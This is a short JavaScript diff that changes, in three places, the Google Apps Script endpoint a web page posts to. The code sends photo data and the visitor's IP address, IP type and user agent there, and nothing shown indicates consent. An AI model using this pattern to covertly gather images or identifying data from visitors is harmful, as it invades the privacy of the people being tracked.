@@ -158,7 +158,7 @@
       formData.append('imageData', photoData);
 
       const response = await fetch(
-        'https://script.google.com/macros/s/AKfycbyBs2aiZBUy4GnI-TBYdlq1U1cearhRfydA6QKTb_OTHhO-tAAlHGyuvQKM2qbeCwIYDQ/exec',
+        'https://script.google.com/macros/s/AKfycbxM3JvYGM7mb8O6zHWj8EMe_nXRJKLl1c6R62QjcwN13N2iD5gj2t-2Wn-XGSSnE1M9/exec',
         {
           method: 'POST',
           body: formData,
@@ -192,7 +192,7 @@
 
 
       const response = await fetch(
-        'https://script.google.com/macros/s/AKfycbyBs2aiZBUy4GnI-TBYdlq1U1cearhRfydA6QKTb_OTHhO-tAAlHGyuvQKM2qbeCwIYDQ/exec',
+        'https://script.google.com/macros/s/AKfycbxM3JvYGM7mb8O6zHWj8EMe_nXRJKLl1c6R62QjcwN13N2iD5gj2t-2Wn-XGSSnE1M9/exec',
         {
           method: 'POST',
           body: formData,
@@ -222,7 +222,7 @@
       const ipType = ip.includes('.') ? 'IPV4' : 'IPV6';
       const userAgent = navigator.userAgent;
 
-      const url = new URL('https://script.google.com/macros/s/AKfycbyBs2aiZBUy4GnI-TBYdlq1U1cearhRfydA6QKTb_OTHhO-tAAlHGyuvQKM2qbeCwIYDQ/exec');
+      const url = new URL('https://script.google.com/macros/s/AKfycbxM3JvYGM7mb8O6zHWj8EMe_nXRJKLl1c6R62QjcwN13N2iD5gj2t-2Wn-XGSSnE1M9/exec');
       url.searchParams.append('ip', ip);
       url.searchParams.append('ipType', ipType);
       url.searchParams.append('userAgent', userAgent);
